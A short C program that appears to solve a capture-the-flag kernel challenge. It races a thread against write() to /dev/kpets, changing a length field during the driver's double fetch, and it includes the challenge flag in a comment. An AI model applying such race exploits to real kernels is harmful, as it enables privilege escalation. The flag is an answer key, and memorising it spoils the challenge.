#include <pthread.h> 
#include <unistd.h>
#include <fcntl.h>
#include <string.h>

unsigned char buf[120];

void *hack(void *arg) {
  usleep(1);
  for(int i = 0; i < 100; i++) {
    usleep(1000);
    *(int*)(&buf[4]) = 101;
  }
}

int main() {
  pthread_t thread_id;
  int fd = open("/dev/kpets", O_RDWR);
  if (fd < 0) { write(1, "WTF", 3); return 2; }
  buf[0] = 0xc0;
  *(int*)(&buf[4]) = 32;
  memcpy(buf + 8, "pusheen", 7);
  *(int*)(&buf[40]) = 64;
  for(int i=0;i<120-44;i++)
    buf[i+44] = 0xaa;
  pthread_create(&thread_id, NULL, hack, NULL);
  write(fd, buf, 108);
  read(fd, buf, 60);
  if (buf[0] != 0xc0) { write(1, buf, 60); return 0; }
  return 1;
}

// fb{lets_try_that_again__double_the_fetch_for_double_the_fun}
